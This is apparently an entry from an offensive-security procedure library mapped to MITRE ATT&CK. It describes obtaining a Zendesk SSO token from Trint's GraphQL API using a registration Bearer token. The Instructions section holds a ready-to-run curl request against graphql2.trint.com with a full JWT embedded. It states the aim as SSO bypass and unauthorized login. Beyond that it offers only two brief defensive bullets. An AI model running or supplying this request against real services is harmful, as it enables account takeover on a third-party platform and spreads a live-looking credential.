---
tags:
  - graphql-query
  - token-retrieval
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/graphql-zendesk-token-query]]'
platforms:
  - Web
techniques:
  - '[[Valid Accounts]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 6f995bd3-3e6f-4420-9eb3-d8df3fcb343b
created_at: '2025-12-13T09:01:26.367Z'
updated_at: '2025-12-13T09:01:26.367Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# Execute GraphQL Query for Zendesk Token

## Summary

This procedure sends a GraphQL query to Trint's API to obtain a Zendesk JWT token using the authorization from the registered account.

## Description

Using the Bearer token from registration, query the zendeskToken field to get a valid JWT for SSO bypass. This exploits the integration between Trint and Zendesk.

## Requirements

1. Authorization Bearer token from Trint registration
2. Access to graphql2.trint.com
3. Tool for sending HTTP requests (e.g., curl)

## Defense

Defensive measures and detection strategies:

- Require email verification before token issuance
- Log and alert on GraphQL queries for sensitive fields

## Objectives

1. Retrieve Zendesk JWT
2. Enable SSO bypass
3. Prepare for unauthorized login

## Instructions

### Step 1: Prepare Query

**Context**: Construct the GraphQL payload.

Use query: 'query zendeskToken { zendeskToken }' with variables {'status':'PENDING'}.

> This targets the token endpoint.

### Step 2: Send Request

**Context**: Execute the query to get the token.

Execute [[commands/graphql-zendesk-token-query]]:

```bash
curl -X POST https://graphql2.trint.com/ \
  -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJodHRwczovL2FwcC50cmludC5jb20vdXNlcklkIjoiNWRjOTUwZWEzOGFhMjI3MmExNzAyMzFkIiwiaHR0cHM6Ly9hcHAudHJpbnQuY29tL2lzTmV3VXNlciI6dHJ1ZSwiaHR0cHM6Ly9zY2hlbWEudHJpbnQuY29tL2F1dGhqdGkiOiI0ZmMwMjUyZS03NTFiLTQwNjctOWU0MC00OGQ4MWMzMjRiMjIiLCJpc3MiOiJodHRwczovL3RyaW50LmF1dGgwLmNvbS8iLCJzdWIiOiJhdXRoMHw1ZGM5NTBlYTM4YWEyMjcyYTE3MDIzMWQiLCJhdWQiOiJ0cmludC1hcGlzIiwiaWF0IjoxNTczNDc0NTQyLCJleHAiOjE1NzYwNjY1NDIsImF6cCI6ImljaDRoeVZZUEtLZ2VFb1RoNmZXUFhjNmZydmVUY1RxIiwiZ3R5IjoicGFzc3dvcmQifQ.JyIc6PZyjidptrvaFT6MykOr0BopUi1F7fZWTvbeKeU' \
  -H 'Content-Type: application/json' \
  -d '{"operationName":null,"variables":{"status":"PENDING"},"query":"query zendeskToken {\n zendeskToken\n }\n"}'
```

> Response includes the JWT.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Valid Accounts]]

### Sub-Techniques



## Commands Used

- [[commands/graphql-zendesk-token-query]]

## Tools Used



## Tags

- [[graphql-query]]
- [[token-retrieval]]
